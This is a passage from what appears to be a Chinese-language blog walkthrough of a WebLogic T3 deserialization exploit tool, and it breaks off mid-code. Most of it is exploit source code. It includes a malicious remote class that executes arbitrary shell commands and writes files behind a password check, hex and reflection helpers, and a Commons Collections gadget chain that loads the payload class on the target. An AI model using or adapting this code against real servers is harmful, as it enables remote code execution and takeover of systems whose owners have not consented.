<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.supeream.payload;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import sun.tools.asm.TryData;</span></span><br><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"><span class="keyword">import</span> weblogic.utils.encoders.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by nike on 17/6/27.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteImpl</span> <span class="keyword">implements</span> <span class="title class_">ClusterMasterRemote</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteImpl</span> <span class="variable">remote</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteImpl</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (args.length == <span class="number">2</span> &amp;&amp; args[<span class="number">0</span>].equalsIgnoreCase(<span class="string">&quot;blind&quot;</span>)) &#123;</span><br><span class="line">                remote.getServerLocation(args[<span class="number">1</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (args.length == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                <span class="keyword">if</span> (args[<span class="number">0</span>].equalsIgnoreCase(<span class="string">&quot;install&quot;</span>)) &#123;</span><br><span class="line">                    ctx.rebind(<span class="string">&quot;supeream&quot;</span>, remote);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (args[<span class="number">0</span>].equalsIgnoreCase(<span class="string">&quot;uninstall&quot;</span>)) &#123;</span><br><span class="line">                    ctx.unbind(<span class="string">&quot;supeream&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setServerLocation</span><span class="params">(String cmd, String args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">uploadFile</span><span class="params">(String path, <span class="type">byte</span>[] content)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line">            fileOutputStream.write(content);</span><br><span class="line">            fileOutputStream.flush();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServerLocation</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!cmd.startsWith(<span class="string">&quot;showmecode&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;guess me?&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cmd = cmd.substring(<span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            List&lt;String&gt; cmds = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmd.startsWith(<span class="string">&quot;$NO$&quot;</span>)) &#123;</span><br><span class="line">                cmds.add(cmd.substring(<span class="number">4</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (isLinux) &#123;</span><br><span class="line">                cmds.add(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">                cmds.add(<span class="string">&quot;-c&quot;</span>);</span><br><span class="line">                cmds.add(cmd);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cmds.add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">                cmds.add(<span class="string">&quot;/c&quot;</span>);</span><br><span class="line">                cmds.add(cmd);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmds);</span><br><span class="line">            processBuilder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line"></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(proc.getInputStream()));</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sb.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这是官方自己构造的恶意远程类，和我们接下来要说的一样，都是构造了继承了<code>ClusterMasterRemote</code>，八九不离十</p>
<h2 id="serial"><a href="#serial" class="headerlink" title="serial"></a>serial</h2><p>这个包里面包含序列化的工具类<br><strong>B</strong>ytesOperation：<br>这个类内涵多种进制转换工具</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.supeream.serial;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by Fernflower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BytesOperation</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] hexStringToBytes(String hexString) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hexString != <span class="literal">null</span> &amp;&amp; !hexString.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            hexString = hexString.toUpperCase();</span><br><span class="line">            <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> hexString.length() / <span class="number">2</span>;</span><br><span class="line">            <span class="type">char</span>[] hexChars = hexString.toCharArray();</span><br><span class="line">            <span class="type">byte</span>[] d = <span class="keyword">new</span> <span class="title class_">byte</span>[length];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> i * <span class="number">2</span>;</span><br><span class="line">                d[i] = (<span class="type">byte</span>) (charToByte(hexChars[pos]) &lt;&lt; <span class="number">4</span> | charToByte(hexChars[pos + <span class="number">1</span>]));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> d;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span> <span class="title function_">charToByte</span><span class="params">(<span class="type">char</span> c)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">byte</span>) <span class="string">&quot;0123456789ABCDEF&quot;</span>.indexOf(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] byteMerger(<span class="type">byte</span>[] byte_1, <span class="type">byte</span>[] byte_2) &#123;</span><br><span class="line">        <span class="type">byte</span>[] byte_3 = <span class="keyword">new</span> <span class="title class_">byte</span>[byte_1.length + byte_2.length];</span><br><span class="line">        System.arraycopy(byte_1, <span class="number">0</span>, byte_3, <span class="number">0</span>, byte_1.length);</span><br><span class="line">        System.arraycopy(byte_2, <span class="number">0</span>, byte_3, byte_1.length, byte_2.length);</span><br><span class="line">        <span class="keyword">return</span> byte_3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHexString</span><span class="params">(<span class="type">byte</span>[] src)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (src == <span class="literal">null</span> || src.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; src.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> src[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">hv</span> <span class="operator">=</span> Integer.toHexString(v);</span><br><span class="line">            <span class="keyword">if</span> (hv.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                stringBuilder.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            stringBuilder.append(hv);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] GetByteByFile(String FilePath) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FilePath);</span><br><span class="line">        <span class="type">byte</span>[] temp = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">50000000</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> fi.read(temp);</span><br><span class="line">        <span class="type">byte</span>[] file = <span class="keyword">new</span> <span class="title class_">byte</span>[length];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            file[i] = temp[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fi.close();</span><br><span class="line">        <span class="keyword">return</span> file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(BytesOperation.bytesToHexString(BytesOperation.GetByteByFile(<span class="string">&quot;/Users/nike/IdeaProjects/weblogic_cmd/lib/remote.jar&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到里面有十六进制转换有关的，由于最后t3协议发过去是16进制，因此需要用到这个工具类<br>Reflection：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.supeream.serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflections</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        <span class="keyword">if</span> (field == <span class="literal">null</span> &amp;&amp; clazz.getSuperclass() != <span class="literal">null</span>) &#123;</span><br><span class="line">            field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(<span class="keyword">final</span> String name) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> ctor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个类就是反射修改东西的类，挺好用的</p>
<p>SerialDataGenerator</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.supeream.serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.supeream.weblogic.BypassPayloadSelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.mozilla.classfile.DefiningClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by nike on 17/7/3.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerialDataGenerator</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">REMOTE</span> <span class="operator">=</span> <span class="string">&quot;com.supeream.payload.RemoteImpl&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">remoteHex</span> <span class="operator">=</span> <span class="string">&quot;不写出来了，恶意文件的16进制&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialData(Transformer[] transformers) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 初始化map 设置laymap</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(innerMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//随便改成什么Transformer</span></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        innerMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,transformerChain);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">_handler</span> <span class="operator">=</span> BypassPayloadSelector.selectBypass(hashMap);</span><br><span class="line">        <span class="keyword">return</span> Serializables.serialize(_handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Transformer[] defineAndLoadPayloadTransformerChain(String className, <span class="type">byte</span>[] clsData, String[] bootArgs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(DefiningClassLoader.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredConstructor&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;defineClass&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, <span class="type">byte</span>[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;className, clsData&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String[].class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span 